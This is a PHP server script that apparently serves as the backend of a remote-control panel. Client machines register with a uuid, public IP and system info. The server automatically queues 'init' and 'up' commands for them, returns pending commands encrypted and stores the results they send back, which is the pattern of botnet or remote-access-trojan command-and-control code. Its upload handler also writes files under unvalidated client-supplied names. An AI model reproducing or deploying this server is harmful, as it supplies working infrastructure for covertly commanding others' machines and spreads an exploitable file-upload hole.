<?php
session_start();


if (file_exists('config/db.php') and $_SERVER['REQUEST_METHOD'] === "GET") {
    unlink('setup.php');
    header("location:panel/login.php");
    die();

} else if (file_exists('setup.php') and $_SERVER['REQUEST_METHOD'] === "GET") {
    header("location:setup.php");
    die();
} else {
    require_once "config/function.php";
    require_once "config/db.php";
    global $connection;
    // get user request
    $input = trim($_POST['DATA']);
    // decrypt user request data
    $data = decrypt_msg($input);
    $json_data = json_decode("$data", true);

    // check request for download wallpaper and etc...
    if (isset($_FILES) and !empty($_FILES) and isset($_GET['upload']) and isset($_GET['uuid']) and !empty($_GET['uuid'])) {
        $uuid=$_GET['uuid'];
        $sql = $connection->prepare("SELECT uuid FROM users WHERE `uuid`=?");
        $sql->bindValue(1, $uuid);
        $sql->execute();
        if ($sql->rowCount() >= 1) {

            $file=$_FILES["file"]["name"];
            move_uploaded_file($_FILES["file"]["tmp_name"], "users/$uuid/$file");
        }
     
     }


    // check request for newuser or update user
    if (isset($json_data['uuid']) and !empty($json_data['uuid']) and isset($_POST['new_user'])) {
        $uuid = clear_string($json_data['uuid']);
        $ip = clear_string($json_data['public_ip']);
        $info = clear_string(serialize($json_data['info']));

        $sql = $connection->prepare("SELECT uuid FROM users WHERE `uuid`=?");
        $sql->bindValue(1, $uuid);
        $sql->execute();
        if ($sql->rowCount() >= 1) {
            $sql = $connection->prepare("UPDATE `users` SET `ip` = ?,`info` = ?,`l_connection` = CURRENT_TIMESTAMP()  WHERE `uuid`=?");
            $sql->bindValue(1, $ip);
            $sql->bindValue(2, $info);
            $sql->bindValue(3, $uuid);
            $sql->execute();
        } else {
           # echo "Need Add";

            $sql = $connection->prepare("INSERT INTO `users` (`uuid`, `ip`, `info`,`l_connection`) VALUES (?, ?,?, CURRENT_TIMESTAMP())");
            $sql->bindValue(1, $uuid);
            $sql->bindValue(2, $ip);
            $sql->bindValue(3, $info);
            $sql->execute();
            // create user folder
            mkdir("users/$uuid");
            $cmd_uid = rand();
            // init command event

            $sql = $connection->prepare("SELECT init FROM event ");
            $sql->execute();
            if ($sql->rowCount() >= 1) {

                $data = $sql->fetch(PDO::FETCH_ASSOC);

                // add init command event
                $sql = $connection->prepare("INSERT INTO `command` (`cmd`, `uuid`,  `cmd_uid`) VALUES (?,?,?);");
                $sql->bindValue(1, $data['init']);
                $sql->bindValue(2, $uuid);
                $sql->bindValue(3, $cmd_uid);
                $sql->execute();
            }

        }
    }

    // check result command
    if (isset($json_data['uuid']) and !empty($json_data['uuid']) and isset($json_data['cmd_uid']) and !empty($json_data['cmd_uid']) and isset($json_data['result']) and !empty($json_data['result'])) {
        $uuid = clear_string($json_data['uuid']);
        $cmd_uid = clear_string($json_data['cmd_uid']);
        $result = clear_string($json_data['result']);
        $sql = $connection->prepare("UPDATE `command` SET `result` = ?,`status` = 1 WHERE cmd_uid=? and uuid=?");
        $sql->bindValue(1, $result);
        $sql->bindValue(2, $cmd_uid);
        $sql->bindValue(3, $uuid);
        $sql->execute();

    } else {
        // prevent loop for up event
        if (!empty($uuid)) {
            // up command event
            $sql = $connection->prepare("SELECT `up` FROM event ");
            $sql->execute();
            if ($sql->rowCount() >= 1) {
                $cmd_uid = rand();
                $data = $sql->fetch(PDO::FETCH_ASSOC);
                // add up command event
                if(!empty(trim($data['up']))){

                $sql = $connection->prepare("INSERT INTO `command` (`cmd`, `uuid`,  `cmd_uid`) VALUES (?,?,?);");
                $sql->bindValue(1, $data['up']);
                $sql->bindValue(2, $uuid);
                $sql->bindValue(3, $cmd_uid);
                $sql->execute();
            }

            }
        }

        $uuid = clear_string($json_data['uuid']);
        $sql = $connection->prepare("SELECT cmd_uid,cmd FROM command WHERE `uuid`=? and `status`=0 ");
        $sql->bindValue(1, $uuid);
        $sql->execute();
        if ($sql->rowCount() >= 1) {
            $data = $sql->fetchAll(PDO::FETCH_ASSOC);

            echo encrypt_msg(json_encode($data));
            $sql = $connection->prepare("UPDATE `users` SET `status` = 1 WHERE uuid=?");
            $sql->bindValue(1, $uuid);
            $sql->execute();


            // run when have fail command
            $sql = $connection->prepare("UPDATE `users` SET `failjob` = 0 WHERE uuid=?");
            $sql->bindValue(1, $uuid);
            $sql->execute();
        } else {


            echo encrypt_msg("wait");
            $sql = $connection->prepare("UPDATE `users` SET `status` = 1, `failjob` = 1 WHERE uuid=?");
            $sql->bindValue(1, $uuid);
            $sql->execute();







        }
        #connection->prepare("UPDATE `users` SET `status` = 1 WHERE uuid=?");
            // $sql->bindValue(1, $uuid);
            // $sql->execute();

    }
}
